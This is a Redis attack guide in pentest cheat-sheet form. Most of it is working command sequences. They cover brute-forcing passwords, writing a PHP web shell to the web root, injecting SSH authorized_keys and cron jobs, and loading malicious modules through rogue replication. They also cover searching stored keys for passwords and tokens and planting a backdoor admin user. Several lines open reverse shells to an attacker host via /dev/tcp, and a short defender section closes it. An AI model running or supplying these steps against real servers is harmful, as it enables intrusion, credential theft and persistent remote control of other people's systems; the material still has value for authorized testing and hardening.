# Port 6379 - Redis - Complete Attack Guide

## Overview

**Protocol**: Redis (Remote Dictionary Server)
**Port**: 6379 (default)
**Transport**: TCP
**Encryption**: Optional (TLS), often unencrypted
**Authentication**: Optional (requirepass), often none

## Attack Objectives

- **Unauthenticated Access**: Connect without password
- **Data Extraction**: Dump all Redis data
- **Remote Code Execution**: Execute OS commands
- **Web Shell Upload**: Write PHP/ASP shells
- **SSH Key Injection**: Add SSH authorized_keys
- **Cron Job Creation**: Establish persistence
- **Master/Slave Exploitation**: Replicate malicious data

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect Redis Service**
```bash
# Quick scan
nmap -p 6379 192.168.1.100

# Service version
nmap -p 6379 -sV 192.168.1.100

# Redis scripts
nmap -p 6379 --script redis-* 192.168.1.100

# Network-wide discovery
nmap -p 6379 192.168.1.0/24 --open
```

**1.2 Banner Grabbing and Information**
```bash
# Using redis-cli
redis-cli -h 192.168.1.100

# Get server info
redis-cli -h 192.168.1.100 INFO

# Check if authentication required
redis-cli -h 192.168.1.100 PING
# Returns "+PONG" if no auth required
# Returns "NOAUTH" if password needed

# Using telnet
telnet 192.168.1.100 6379
PING

# Using nc
echo -e "PING\r\n" | nc 192.168.1.100 6379
```

**1.3 Get Redis Configuration**
```bash
# If unauthenticated access
redis-cli -h 192.168.1.100 CONFIG GET "*"

# Get specific config
redis-cli -h 192.168.1.100 CONFIG GET dir
redis-cli -h 192.168.1.100 CONFIG GET dbfilename
redis-cli -h 192.168.1.100 CONFIG GET requirepass
```

### Phase 2: Unauthenticated Access

**2.1 Test for No Authentication**
```bash
# Connect without password
redis-cli -h 192.168.1.100

# Test commands
redis-cli -h 192.168.1.100 INFO
redis-cli -h 192.168.1.100 KEYS *

# If successful = unauthenticated access!
```

**2.2 Authentication Bypass (CVE-2015-4335)**
```bash
# Older Redis versions
# Lua sandbox escape

# Using Metasploit
use auxiliary/scanner/redis/redis_server
set RHOSTS 192.168.1.100
run
```

### Phase 3: Credential Attacks

**3.1 Brute Force Redis Password**
```bash
# Using Hydra
hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.1.100

# Custom wordlist
hydra -P redis_passwords.txt redis://192.168.1.100

# Using Nmap
nmap -p 6379 --script redis-brute 192.168.1.100

# Using Metasploit
use auxiliary/scanner/redis/redis_login
set RHOSTS 192.168.1.100
set PASS_FILE passwords.txt
run
```

**3.2 Common Redis Passwords**
```bash
# Common defaults
redis
password
12345678
root
admin
foobared  # Default in redis.conf example

# Test manually
redis-cli -h 192.168.1.100 -a redis
redis-cli -h 192.168.1.100 -a password
```

### Phase 4: Remote Code Execution

**4.1 Web Shell Upload (PHP)**
```bash
# Requirements:
# - Know web root directory
# - Web server (Apache/Nginx) running
# - Redis has write permission

# Connect to Redis
redis-cli -h 192.168.1.100

# Set configuration
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET test '<?php system($_GET["cmd"]); ?>'
SAVE

# Access web shell
curl http://192.168.1.100/shell.php?cmd=whoami

# Or one-liner
redis-cli -h 192.168.1.100 flushall
redis-cli -h 192.168.1.100 config set dir /var/www/html/
redis-cli -h 192.168.1.100 config set dbfilename shell.php
redis-cli -h 192.168.1.100 set test '<?php system($_GET["cmd"]); ?>'
redis-cli -h 192.168.1.100 save
```

**4.2 SSH Key Injection**
```bash
# Requirements:
# - Know user home directory
# - .ssh directory exists
# - Redis has write permission

# Generate SSH key pair
ssh-keygen -t rsa -f redis_key

# Connect to Redis
redis-cli -h 192.168.1.100

# Prepare key
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject key
redis-cli -h 192.168.1.100 flushall
redis-cli -h 192.168.1.100 config set dir /home/user/.ssh/
redis-cli -h 192.168.1.100 config set dbfilename authorized_keys
cat key.txt | redis-cli -h 192.168.1.100 -x set ssh_key
redis-cli -h 192.168.1.100 save

# Connect via SSH
ssh -i redis_key user@192.168.1.100

# Or using script
python redis_ssh_inject.py -h 192.168.1.100 -u user -k redis_key.pub
```

**4.3 Cron Job Injection**
```bash
# Requirements:
# - Redis has write permission to /var/spool/cron/

# Connect to Redis
redis-cli -h 192.168.1.100

# Create cron job
redis-cli -h 192.168.1.100 flushall
redis-cli -h 192.168.1.100 config set dir /var/spool/cron/
redis-cli -h 192.168.1.100 config set dbfilename root
redis-cli -h 192.168.1.100 set test '\n\n*/1 * * * * bash -i >& /dev/tcp/attacker_ip/4444 0>&1\n\n'
redis-cli -h 192.168.1.100 save

# Reverse shell executes every minute
nc -lvp 4444
```

**4.4 Module Loading (Redis 4.x+)**
```bash
# Load malicious Redis module (.so file)
# Module can execute arbitrary code

# Compile malicious module
gcc -shared -o evil.so evil.c -fPIC

# Upload to server (via web upload, etc.)

# Load module
redis-cli -h 192.168.1.100 MODULE LOAD /tmp/evil.so

# Execute module function
redis-cli -h 192.168.1.100 evil.exec "whoami"

# Using redis-rogue-server
python redis-rogue-server.py --rhost 192.168.1.100 --lhost attacker_ip
```

**4.5 Master/Slave Replication RCE**
```bash
# Abuse Redis replication to load malicious module

# Using redis-rogue-server
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server
python redis-rogue-server.py --rhost 192.168.1.100 --lhost attacker_ip

# Executes commands on target Redis

# Manual approach
# 1. Setup rogue Redis master
# 2. Configure target to replicate from you
redis-cli -h 192.168.1.100 SLAVEOF attacker_ip 6379
# 3. Send malicious module
# 4. Target loads and executes
```

**4.6 Lua Sandbox Escape (Older Versions)**
```bash
# CVE-2015-4335 - Redis < 3.0.2
# Lua sandbox escape for RCE

redis-cli -h 192.168.1.100 eval "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('whoami', 'r'); local res = f:read('*a'); f:close(); return res" 0
```

### Phase 5: Data Extraction

**5.1 Dump All Keys**
```bash
# List all keys
redis-cli -h 192.168.1.100 KEYS "*"

# Get all keys and values
redis-cli -h 192.168.1.100 --scan | while read key; do
  echo "Key: $key"
  redis-cli -h 192.168.1.100 GET "$key"
done

# Dump to file
redis-cli -h 192.168.1.100 --rdb dump.rdb

# Export all data
redis-cli -h 192.168.1.100 --scan > all_keys.txt
```

**5.2 Search for Sensitive Data**
```bash
# Search for passwords
redis-cli -h 192.168.1.100 KEYS "*password*"
redis-cli -h 192.168.1.100 KEYS "*passwd*"
redis-cli -h 192.168.1.100 KEYS "*pwd*"

# Search for tokens
redis-cli -h 192.168.1.100 KEYS "*token*"
redis-cli -h 192.168.1.100 KEYS "*secret*"
redis-cli -h 192.168.1.100 KEYS "*api*key*"

# Search for sessions
redis-cli -h 192.168.1.100 KEYS "*session*"
redis-cli -h 192.168.1.100 KEYS "*PHPSESSID*"

# Get values
redis-cli -h 192.168.1.100 GET "session:admin"
```

**5.3 Database Info**
```bash
# Get database size
redis-cli -h 192.168.1.100 DBSIZE

# Get info about all databases
redis-cli -h 192.168.1.100 INFO keyspace

# Select database and dump
redis-cli -h 192.168.1.100 SELECT 0
redis-cli -h 192.168.1.100 KEYS "*"

# Repeat for all databases (0-15 by default)
```

### Phase 6: Post-Exploitation

**6.1 Persistence**
```bash
# SSH key (see 4.2)
# Cron job (see 4.3)
# Web shell (see 4.1)

# Backdoor user in application
# If Redis stores user data
redis-cli -h 192.168.1.100 SET "user:backdoor" '{"username":"backdoor","password":"hash","role":"admin"}'
```

**6.2 Lateral Movement**
```bash
# Look for other service credentials in Redis
redis-cli -h 192.168.1.100 KEYS "*"

# Common keys that might contain creds:
# - database:password
# - mysql:password
# - postgres:credentials
# - api:keys
# - smtp:config

# Extract and use on other services
```

## Bypass Techniques

### Bypassing Authentication

**Method 1: No Auth (Misconfiguration)**
```bash
# Most common
# Redis often deployed without password
redis-cli -h 192.168.1.100 INFO
```

**Method 2: Weak Password**
```bash
# Brute force common passwords
for pass in "redis" "password" "12345678"; do
  redis-cli -h 192.168.1.100 -a $pass PING 2>&1 | grep -q "PONG" && echo "Password found: $pass"
done
```

**Method 3: Config File Exposure**
```bash
# If you can read /etc/redis/redis.conf
# Or via web app LFI
# Password in plaintext: requirepass foobared
```

### Bypassing Firewall

```bash
# SSH tunnel
ssh -L 6380:192.168.1.100:6379 user@jumphost
redis-cli -h localhost -p 6380
```

## Information Extraction

**Critical Commands**:
```bash
# Server info
INFO

# All keys
KEYS *

# Database size
DBSIZE

# Configuration
CONFIG GET *

# Client list
CLIENT LIST

# Slow log
SLOWLOG GET 10
```

## Security Recommendations

**For Defenders**:
1. **Require Password** - Always set requirepass
2. **Bind to Localhost** - bind 127.0.0.1
3. **Firewall** - Block port 6379 from internet
4. **Protected Mode** - Enable in Redis 3.2+
5. **Disable Dangerous Commands** - rename CONFIG, FLUSHALL
6. **TLS Encryption** - Use Redis 6+ with TLS
7. **Least Privilege** - Don't run as root
8. **Regular Backups** - But secure them
9. **Monitor Logs** - Detect unauthorized access
10. **Update Redis** - Patch known vulnerabilities

## Common Mistakes

**Attacker Mistakes**:
1. Not checking for unauth access first
2. Forgetting to test web root paths
3. Not checking all databases (SELECT 0-15)
4. Overwriting important data with FLUSHALL

**Defender Mistakes**:
1. **No password** - Most critical
2. **Exposed to internet** - Port 6379 public
3. **Running as root** - Allows SSH key injection
4. **No firewall** - Anyone can connect
5. **Default config** - Protected mode off
6. **Dangerous commands enabled** - CONFIG, MODULE LOAD

## Practical Attack Scenario

```bash
# Discovery
nmap -p 6379 192.168.1.0/24 --open
# Found: 192.168.1.100:6379

# Test authentication
redis-cli -h 192.168.1.100 INFO
# SUCCESS! No authentication required!

# Get config
redis-cli -h 192.168.1.100 CONFIG GET dir
# dir: /var/www/html

# Upload web shell
redis-cli -h 192.168.1.100 config set dir /var/www/html/
redis-cli -h 192.168.1.100 config set dbfilename shell.php
redis-cli -h 192.168.1.100 set test '<?php system($_GET["cmd"]); ?>'
redis-cli -h 192.168.1.100 save

# Access shell
curl http://192.168.1.100/shell.php?cmd=id
# uid=33(www-data)

# Get reverse shell
curl http://192.168.1.100/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

# Shell received!
# Full system compromise
```

## Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap
- **Enumeration**: redis-cli
- **Brute Force**: Hydra, Nmap
- **RCE**: redis-rogue-server, manual
- **Data Extraction**: redis-cli --rdb
- **Exploitation**: Metasploit, custom scripts

## Related Attacks

- **Port 80/443**: Upload web shell
- **Port 22**: SSH key injection
- **Port 3306/5432**: Credentials in Redis
- **Port 11211 (Memcached)**: Similar attacks

---

**Last Updated**: 2026-06-16
